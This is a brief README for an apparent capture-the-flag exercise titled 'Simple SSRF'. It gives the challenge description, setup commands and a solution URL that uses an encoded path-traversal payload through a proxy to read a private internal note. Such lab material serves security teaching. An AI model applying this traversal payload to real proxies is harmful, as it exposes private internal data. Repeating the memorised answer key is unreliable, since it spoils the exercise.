# Simple SSRF
Difficulty: 2/10

## Description
A proxy server servs public notes in the internal server. break out, read the private note.

## set-up
As simple as:
```
npm install
npm init
```
## Solution:
```
http://ip:5050/proxy/internal_website/..%2fprivate%2fprivate_note
```
